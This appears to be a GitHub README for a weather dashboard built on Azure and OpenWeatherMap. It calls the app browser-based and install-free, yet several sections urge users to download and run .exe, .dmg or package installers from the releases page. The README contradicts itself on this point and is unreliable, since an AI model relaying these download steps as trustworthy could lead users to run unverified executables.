# ☁️ AZURE-Weather - Simple Real-Time Weather Dashboard

[![Download AZURE-Weather](https://img.shields.io/badge/Download-AZURE--Weather-blue?style=for-the-badge&logo=github)](https://github.com/kyriesuu/AZURE-Weather/releases)

## 🌤 About AZURE-Weather

AZURE-Weather is a weather app that shows you current conditions and forecasts for the next five days. It uses live data from OpenWeatherMap to keep the info fresh. The app runs on Microsoft Azure, which means it uses modern cloud tech but you don’t have to worry about that. You get a clean layout that updates automatically, so you always know what the weather looks like wherever you are.

This app is good for everyday users who want a quick way to check the weather without installing complex programs or dealing with ads. It works on most web browsers and updates information using the internet quietly in the background.  

---

## 🚀 Getting Started

You don’t need to install anything fancy or know how to code to use AZURE-Weather. It is a web-based app powered by Azure Static Web Apps, so you can run it anywhere you have an internet connection and a modern browser like Chrome, Firefox, Edge, or Safari.

If you want a stable copy on your computer or work station, you can download it from the release page here:

[Download AZURE-Weather](https://github.com/kyriesuu/AZURE-Weather/releases)

This link takes you to the official GitHub release page, where you can find the latest versions ready to use.

---

## 💾 Download & Install

### Step 1: Open the Download Page

Visit this page to download AZURE-Weather:

[https://github.com/kyriesuu/AZURE-Weather/releases](https://github.com/kyriesuu/AZURE-Weather/releases)

You will see a list of release versions. Click on the latest version to see available files.

### Step 2: Choose Your Version

Look for files that match your computer system:

- Windows users should look for `.exe` files or Windows-specific installers.
- Mac users should look for `.dmg` or `.zip` archives.
- Linux users can check for `.deb`, `.rpm`, or compatible packages.

If you find compressed archives like ZIP files, download and extract them.

### Step 3: Run the App

Once downloaded, open the file. On Windows, this usually means double-clicking the installer or executable. On Mac, drag the app to your Applications folder. On Linux, follow your system’s instructions to run the package.

### Step 4: Using the App

After launch, AZURE-Weather will show you the current weather and forecast for your area or any location you enter.

---

## 🖥 System Requirements

To run AZURE-Weather smoothly, your setup should meet these basic requirements:

- Operating System: Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
- Browser: Latest version of Chrome, Firefox, Edge, or Safari.
- Internet Connection: A stable internet link to fetch live data.
- Processor: Dual-core 1.5 GHz or better.
- Memory: At least 2 GB RAM.
- Storage: Around 100 MB free space for installation files and cache.

The app is designed to be lightweight and fast so it works well on most modern computers and laptops.

---

## 🔍 Features

AZURE-Weather offers features useful for those who want quick weather info without complexity:

- Real-time weather updates from the OpenWeatherMap API.
- Current conditions including temperature, humidity, wind speed, and visibility.
- 5-day weather forecast with high and low temperatures and chance of rain.
- Simple, clean design easy to read on any screen.
- Cloud-based backend ensures quick loading and automatic updates.
- Runs in any modern web browser without installation.
- Automated updates with CI/CD pipeline via GitHub Actions ensure you always get the latest version.

---

## 🌐 How It Works

AZURE-Weather uses Azure Functions written in Python to request weather data from OpenWeatherMap. This data is processed and served to the frontend, which is a static web app styled with Tailwind CSS to keep the interface clear and responsive.

The system automatically builds and deploys new versions using GitHub Actions. This means the app stays up to date without any manual work from you.

All the heavy lifting happens in the cloud, and your device just displays the finished results.

---

## ⚙️ Configuration & Usage Tips

- When you open the app, it tries to get your location from the browser. Allow this if you want local weather automatically.
- Use the search bar to check weather in other cities or countries.
- Refresh the page if you want to update the weather manually.
- If you have slow internet, allow a moment for data to load on startup.
- Bookmark the page or app on your device for quick access later.
  
---

## 📜 About the Data Source

The weather information comes from OpenWeatherMap, a reliable worldwide weather service. It provides accurate temperature, wind, humidity, and forecasts.

The data is fetched by the app’s backend on Azure and updated every few minutes to keep info current.

---

## 🛠 Support & Feedback

If you run into issues running the app or want to request features, you can create an issue on the GitHub repository:

[AZURE-Weather Issues](https://github.com/kyriesuu/AZURE-Weather/issues)

For basic help, check if your internet is working and your browser is up to date.

---

## 📚 Additional Information

- The app does not collect personal information.
- It uses serverless functions, so no server maintenance is needed.
- The automatic deployment pipeline means new features and fixes come quickly.
- The layout is mobile-friendly and adjusts to different screen sizes.

---

## 🔖 License

AZURE-Weather is open-source. See the repository for the full license details. You can use and share it freely under the terms provided.